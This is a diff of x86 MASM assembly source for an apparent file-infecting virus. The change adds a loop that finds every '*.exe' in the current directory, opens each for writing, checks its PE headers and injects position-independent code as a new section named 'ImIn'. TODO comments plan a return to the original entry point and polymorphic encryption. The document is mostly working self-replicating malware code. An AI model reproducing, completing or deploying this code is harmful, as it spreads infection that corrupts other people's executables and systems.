@@ -20,7 +20,7 @@ includelib	\masm32\lib\msvcrt.lib
 ; Source of life
 ; Macro to avoid repetition when pushing offset with delta
 PDELTA		macro	Addr
-			mov	eax, Addr
+			mov	eax, offset Addr
 			add	eax, ebp
 			push	eax
 		endm
@@ -34,7 +34,7 @@ PVDELTA		macro	Addr
 DELTA		equ	ebp + offset
 ; Such wow
 GETADDR		macro	Name, Lib, Save
-			PDELTA	offset Name
+			PDELTA	Name
 			push	[DELTA Lib]
 			call	[DELTA pGetProcAddress]
 			mov	[DELTA Save], eax
@@ -45,6 +45,12 @@ GETADDR		macro	Name, Lib, Save
 
 toInject:
 jmp	start
+
+; FILE
+FileData		WIN32_FIND_DATA	<>
+SearchFolder		db		"*.exe", 0
+HandleSearch		dd		?
+NewSectionName		db		"ImIn", 0
 
 ; PE
 PeFile			dd	?
@@ -63,13 +69,6 @@ VirtualAddress		dd	?
 SizeOfRawData		dd	?
 PointerToRawData	dd	?
 
-; Debug
-ErrorMessage	db	"Error_Injecting",0
-FileName	db	"donothing.exe",0
-String_string	db	"%s ",0
-String_number	db	"%d ",0
-NewSectionName	db	"ImIn",0
-
 ; DLL
 sExitProcess	db	'ExitProcess', 0 
 sCreateFile	db	'CreateFileA', 0 
@@ -81,6 +80,8 @@ sWriteFile	db	'WriteFile', 0
 sGetProcAddress	db	'GetProcAddress', 0 
 sMessageBox	db	'MessageBoxA', 0 
 sLoadLibrary	db	'LoadLibraryA', 0 
+sFindFirstFile	db	'FindFirstFileA', 0
+sFindNextFile	db	'FindNextFileA', 0
 sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
 sUser32		db	'USER32.DLL', 0
 sKernel32	db	'KERNEL32.DLL', 0
@@ -96,8 +97,14 @@ pKernel32	dd	?
 pUser32		dd	?
 pLoadLibrary	dd	?
 pGetProcAddress	dd	?
+pFindFirstFile	dd	?
+pFindNextFile	dd	?
 
 
+; TODO
+; Seek TODO
+; Jmp to old entry point after injecting
+; Polymorphism : Create decrypter, copy it, copy opcode encrypted (Add this to the size ?)
 
 start:
 ; Delta offset for PIC
@@ -151,7 +158,7 @@ mov	[DELTA pGetProcAddress], edx
 
 ; Get User32 (Not without LoadLibrary !)
 GETADDR	sLoadLibrary, pKernel32, pLoadLibrary
-PDELTA	offset sUser32
+PDELTA	sUser32
 call	[DELTA pLoadLibrary] ; LoadLibrary("user32.dll")
 mov	[DELTA pUser32], eax
 ; GET ALL THE THINGS !
@@ -163,10 +170,30 @@ GETADDR	sMapViewOfFile, pKernel32, pMapViewOfFile
 GETADDR	sUnmapViewOfFile, pKernel32, pUnmapViewOfFile
 GETADDR	sCloseHandle, pKernel32, pCloseHandle
 GETADDR	sWriteFile, pKernel32, pWriteFile
+GETADDR	sFindFirstFile, pKernel32, pFindFirstFile
+GETADDR	sFindNextFile, pKernel32, pFindNextFile
 ; Test!
 push	0
-PDELTA	offset sHelloWorld
-PDELTA	offset sHelloWorld
+PDELTA	sHelloWorld
+PDELTA	sHelloWorld
+push	0
+call	[DELTA pMessageBox]
+
+
+; INJECT ALL THE FILES !
+PDELTA	FileData
+PDELTA	SearchFolder
+call	[DELTA pFindFirstFile]
+cmp	eax, INVALID_HANDLE_VALUE
+je	errorExit
+mov	[DELTA HandleSearch], eax
+
+; INJECT THE NEXT !
+nextFileToInject:
+; DEBUG FILE TO INJECT - TODO REMOVE
+push	0
+push	0
+PDELTA	FileData.cFileName
 push	0
 call	[DELTA pMessageBox]
 
@@ -180,9 +207,10 @@ push	0
 mov	eax, GENERIC_READ
 or	eax, GENERIC_WRITE
 push	eax
-PDELTA	offset FileName
+PDELTA	FileData.cFileName
 call	[DELTA pCreateFile]
-call	CheckError
+cmp	eax, INVALID_HANDLE_VALUE
+je	errorOpen
 mov	[DELTA PeFile], eax
 
 ; CREATE_FILE_MAPPING
@@ -194,7 +222,7 @@ push	NULL
 PVDELTA	PeFile
 call	[DELTA pCreateFileMapping]
 cmp	eax, 0
-je	JumpCheckError
+je	errorCreateMapping
 mov	[DELTA PeMapObject], eax
 
 ; MAP_VIEW_OF_FILE
@@ -207,13 +235,13 @@ push	eax
 PVDELTA	PeMapObject
 call	[DELTA pMapViewOfFile]
 cmp	eax, 0
-je	JumpCheckError
+je	errorMapFile
 mov	[DELTA PeFileMap], eax
 mov	ebx, eax
 
 ; CHECK MAGIC
 cmp	word ptr [ebx], IMAGE_DOS_SIGNATURE
-jne	JumpCheckError
+jne	errorInjecting
 
 
 ; CHECK IMAGE_NET_SIGNATURE
@@ -223,7 +251,7 @@ mov	edx, ebx
 add	edx, dword ptr [ecx]
 mov	[DELTA PeNtHeader], edx
 cmp	dword ptr [edx], IMAGE_NT_SIGNATURE
-jne	JumpCheckError
+jne	errorInjecting
 
 ; GET OPTIONAL HEADER useless so far
 mov	[DELTA PeOptionalHeader], edx
@@ -260,9 +288,6 @@ jg	keepLastSec
 mov	[DELTA LastSecHeader], esi
 mov	[DELTA LastSec], eax
 keepLastSec:
-; SHOW NAME
-mov	eax, esi
-call	DebugMessageBox
 add	esi, 028h
 loop	Loop_SectionHeader
 
@@ -392,7 +417,7 @@ push	NULL
 PVDELTA	PeFile
 call	[DELTA pCreateFileMapping]
 cmp	eax, 0
-je	JumpCheckError
+je	errorCreateMapping
 mov	[DELTA PeMapObject], eax
 
 ; MAP_VIEW_OF_FILE
@@ -405,7 +430,7 @@ push	eax
 PVDELTA	PeMapObject
 call	[DELTA pMapViewOfFile]
 cmp	eax, 0
-je	JumpCheckError
+je	errorMapFile
 mov	[DELTA PeFileMap], eax
 
 ; INSERTING NEW SECTION - OPCODE COPY
@@ -419,18 +444,40 @@ lodsb
 stosb
 loop	createNewSection
 
-; CLOSE
+; FILE INJECTED - TODO REMOVE
+push	0
+push	0
+PDELTA	FileData.cFileName
+push	0
+call	[DELTA pMessageBox]
+
+
+; MANAGE ALL KINDS OF ERRORS !
+errorInjecting:
 PVDELTA	PeFileMap
 call	[DELTA pUnmapViewOfFile]
+
+errorMapFile:
 PVDELTA	PeMapObject
 call	[DELTA pCloseHandle]
+
+errorCreateMapping:
 PVDELTA	PeFile
 call	[DELTA pCloseHandle]
 
+; TO THIS POINT WE GET THE NEXT FILE (IF POSSIBLE)
+errorOpen:
+PDELTA	FileData
+PVDELTA	HandleSearch
+call	[DELTA pFindNextFile]
+cmp	eax, 0
+je	errorExit
+jmp	nextFileToInject
 
-; EXIT
+errorExit:
 push	0
 call 	[DELTA pExitProcess]
+
 
 ; UTILS
 ; Compare two strings : ecx/edx (EAX[0]: MATCH)
@@ -451,50 +498,6 @@ xor	eax, eax
 nomatch:
 ret
 
-
-; Debug
-print_str	proc
-pusha
-push	eax
-;push	offset String_string
-;call	crt_printf
-popa
-ret
-print_str	endp
-
-print_int	proc
-pusha
-push	eax
-push	offset String_number
-call	crt_printf
-popa
-ret
-print_int	endp
-
-CheckError:
-cmp	eax, INVALID_HANDLE_VALUE
-jne	EndErrorDebug
-JumpCheckError:
-mov	eax, offset ErrorMessage
-add	eax, ebp
-call	DebugMessageBox
-push	eax
-push	0
-call	[DELTA pExitProcess]
-EndErrorDebug:
-ret
-
-DebugMessageBox	proc
-pusha
-mov	edx, eax
-push	MB_OK
-PDELTA	offset ErrorMessage
-push	edx
-push	0
-call	[DELTA pMessageBox]
-popa
-ret
-DebugMessageBox	endp
 
 ; TODO: Because endInject - toInject is NOT WORKING (There is like 10bytes missing when INSERTING OPCODES)
 SomePadding	db	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",0
